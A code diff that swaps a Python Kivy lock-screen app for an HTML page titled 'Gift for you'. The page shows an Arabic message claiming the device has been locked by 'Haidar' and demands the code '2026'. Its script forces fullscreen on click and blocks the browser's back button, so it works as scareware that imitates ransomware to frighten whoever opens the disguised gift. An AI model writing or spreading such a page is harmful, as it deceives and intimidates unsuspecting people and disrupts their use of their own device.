@@ -1,39 +1,44 @@
-from kivy.app import App
-from kivy.uix.boxlayout import BoxLayout
-from kivy.uix.label import Label
-from kivy.uix.textinput import TextInput
-from kivy.uix.button import Button
-from kivy.core.window import Window
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Gift for you</title>
+    <style>
+        body { background-color: black; color: red; text-align: center; font-family: Arial; padding-top: 20%; }
+        #lock-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 9999; }
+    </style>
+</head>
+<body onclick="openFullscreen();">
 
-# الرمز الخاص بك للفتح
-MY_KEY = "2026"
+    <div id="lock-screen">
+        <h1>تم قفل جهازك بواسطة حيدر</h1>
+        <p>لا يمكنك الخروج من هذه الصفحة</p>
+        <input type="password" id="pass" placeholder="أدخل الرمز للفتح">
+        <button onclick="check()">فك القفل</button>
+    </div>
 
-class LockerApp(App):
-    def build(self):
-        # جعل التطبيق يملأ الشاشة بالكامل
-        Window.borderless = True
-        Window.fullscreen = 'auto'
-        
-        self.layout = BoxLayout(orientation='vertical', padding=50, spacing=20)
-        self.layout.canvas.before.add # (هنا نضع خلفية سوداء)
-        
-        self.msg = Label(text="تم اختراق وقفل جهازك من قبل حيدر\nأدخل الرمز للفتح", 
-                         font_size='25sp', color=(1, 0, 0, 1))
-        
-        self.input = TextInput(hint_text="Code...", password=True, multiline=False)
-        self.btn = Button(text="Unlock", background_color=(0, 1, 0, 1))
-        self.btn.bind(on_press=self.check_code)
-        
-        self.layout.add_widget(self.msg)
-        self.layout.add_widget(self.input)
-        self.layout.add_widget(self.btn)
-        
-        return self.layout
+    <script>
+        // دالة تجعل الصفحة تمتد على كامل الشاشة وتقفل الخروج
+        function openFullscreen() {
+            var elem = document.documentElement;
+            if (elem.requestFullscreen) { elem.requestFullscreen(); }
+        }
 
-    def check_code(self, instance):
-        if self.input.text == MY_KEY:
-            App.get_running_app().stop()
-
-if __name__ == "__main__":
-    LockerApp().run()
+        function check() {
+            var p = document.getElementById("pass").value;
+            if (p == "2026") {
+                alert("تم الفتح");
+                window.location.href = "https://www.google.com";
+            } else {
+                alert("رمز خاطئ!");
+            }
+        }
+        
+        // منع زر الرجوع
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+    </script>
+</body>
+</html>
 
